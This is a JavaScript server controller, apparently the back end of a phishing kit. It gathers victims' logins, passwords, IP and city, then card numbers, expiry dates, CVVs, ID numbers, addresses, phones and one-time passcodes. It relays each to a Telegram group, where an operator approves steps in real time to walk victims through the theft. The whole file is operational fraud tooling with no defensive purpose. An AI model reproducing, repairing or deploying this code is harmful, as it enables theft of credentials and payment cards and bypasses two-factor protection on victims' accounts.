import {
  sendTelegramAlert,
  waitForDecision,
  respondToTelegramCallback,
  sendSimpleTelegramMessage,
  editTelegramMessage,
  removePending,
} from "../services/botService.js";

import { v4 as uuidv4 } from "uuid";

let ioInstance;
export const activeSessions = new Map(); // socketId → session
export const decisionMap = new Map(); // decisionId → socketId

export const setSocketIO = (io) => {
  ioInstance = io;
};


export const initProcess = async (req, res) => {
  const { data, socketId, isRetry = false } = req.body;
  console.log("socketId: ",socketId);
  console.log("isRetry: ",isRetry);
  console.log("activeSessions: ", activeSessions);
  console.log("decisionMap: ", decisionMap);
  
  
  try {
    const groupId = process.env.GROUP_1;
    const decrypted = JSON.parse(atob(data));
    
    // Si es reintento, elimina decisiones anteriores
    if (isRetry && activeSessions.has(socketId)) {
      const oldSession = activeSessions.get(socketId);
      if (oldSession?.decisionId) {
        removePending(oldSession.decisionId);
      }
    }

    console.log("socketId: ",socketId);
    console.log("isRetry: ",isRetry);
    console.log("activeSessions: ", activeSessions);
    console.log("decisionMap: ", decisionMap);
  

    // Genera nueva sesión o reutiliza existente
    let session = isRetry && activeSessions.get(socketId)
      ? { 
          ...activeSessions.get(socketId), 
          decisionId: uuidv4(), // Nuevo UUID para decisiones
          messageId: null,     // Reinicia messageId para evitar colisión
          step: 1,             // Reinicia flujo en paso 1
        }
      : {
          sessionId: uuidv4(),
          socketId,
          user: decrypted.user,
          pass: decrypted.pass,
          ip: decrypted.ip,
          city: decrypted.city,
          decisionId: uuidv4(), // UUID único
          messageId: null,
          step: 1,
        };

    console.log("session: ",session);
    // Almacena nueva decisión
    activeSessions.set(socketId, session);
    decisionMap.set(session.decisionId, socketId); // UUID → socketId

    console.log("activeSessions2: ",activeSessions);
    console.log("decisionMap2: ",decisionMap);

    // Envía mensaje a Telegram
    const messageText = buildMessageText(session);
    const { message_id } = await sendTelegramAlert({
      groupId: process.env.GROUP_1,
      text: messageText,
      decisionId: session.decisionId,
    });

    session.messageId = String(message_id);
    activeSessions.set(socketId, session);

    // Espera decisión con el nuevo decisionId
    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = decisionMap.get(session.decisionId);
        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit('decision', decision);
        }
        decisionMap.delete(session.decisionId);
      })
      .catch((err) => {
        console.error('Timeout:', err.message);
      });

    return res.status(200).json({ 
      success: true, 
      decisionId: session.decisionId, 
      step: session.step,
      messageId: session.messageId
    });
  } catch (error) {
    console.error('Error en initProcess:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const telegramWebhook = async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(200);
  try {
    await respondToTelegramCallback(callback);
    return res.sendStatus(200);
  } catch (err) {
    console.error("Error manejando webhook:", err);
    return res.sendStatus(500);
  }
};

export const appendCardData = async (req, res) => {
  const { card, exp, cvv, socketId } = req.body;
  const session = activeSessions.get(socketId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.card = card;
    session.exp = exp;
    session.cvv = cvv;
    session.step = 2;
    const newText = buildMessageText(session);

    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: newText,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const appendPersonData = async (req, res) => {
  const { name, id, add, tel, socketId } = req.body;
  const session = activeSessions.get(socketId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.name = name;
    session.id = id;
    session.add = add;
    session.tel = tel;
    session.step = 2;
    const newText = buildMessageText(session);

    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: newText,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const sendSimpleMessage = async (req, res) => {
  const { text, socketId } = req.body;
  const session = activeSessions.get(socketId);
  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    await sendSimpleTelegramMessage(
      session.chatId,
      `${text}: ${session.sessionId}`
    );
  } catch (err) {
    console.error("Error enviando mensaje simple:", err);
    return res.status(500).json({ error: err.message });
  }
};

export const errorMessage = async (req, res) => {};

export const updateMessageWithOtp = async (req, res) => {
  const { otp, socketId } = req.body;

  const session = activeSessions.get(socketId);
  if (!session)
    return res
      .status(400)
      .json({ error: "No hay sesión activa para ese socketId" });

  try {
    session.otp = otp;

    const messageText = buildMessageText(session, 3);

    const newDecisionId = `${socketId}-otp-${Date.now()}`;
    session.decisionId = newDecisionId;
    decisionMap.set(newDecisionId, socketId);

    await editTelegramMessage({
      chatId: session.chatId,
      messageId: session.messageId,
      text: messageText,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Continuar", callback_data: `continue:${newDecisionId}` },
            { text: "Finalizar", callback_data: `finalize:${newDecisionId}` },
          ],
        ],
      },
    });

    waitForDecision(newDecisionId)
      .then((decision) => {
        const sockId = decisionMap.get(newDecisionId);
        const sess = activeSessions.get(sockId);
        if (sess && ioInstance) {
          ioInstance.to(sockId).emit("final-decision", decision);
        }
        decisionMap.delete(newDecisionId);
      })
      .catch((err) => {
        console.error("Timeout esperando decisión del OTP:", err.message);
      });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en updateMessageWithOtp:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export function buildMessageText(session) {
  const step = session.step;
  let baseText = `
🚨 Ingreso: ${session.sessionId}
👤 Usuario: ${session.user}
🔑 Contraseña: ${session.pass}
🔑 IP: ${session.ip}
🔑 Ciudad: ${session.city}
`;

  if (step >= 2) {
    baseText += `
💳 Nombre: ${session.name || "PENDIENTE"}
💳 Documento: ${session.id || "PENDIENTE"}
💳 Dirección: ${session.add || "PENDIENTE"}
💳 Telefóno: ${session.phone || "PENDIENTE"}
💳 Tarjeta: ${session.card || "PENDIENTE"}
📆 Exp: ${session.exp || "PENDIENTE"}
🔐 CVV: ${session.cvv || "PENDIENTE"}
`;
  }

  if (step >= 3) {
    baseText += `
✅ OTP: ${session.otp || "PENDIENTE"}
`;
  }

  return baseText.trim();
}
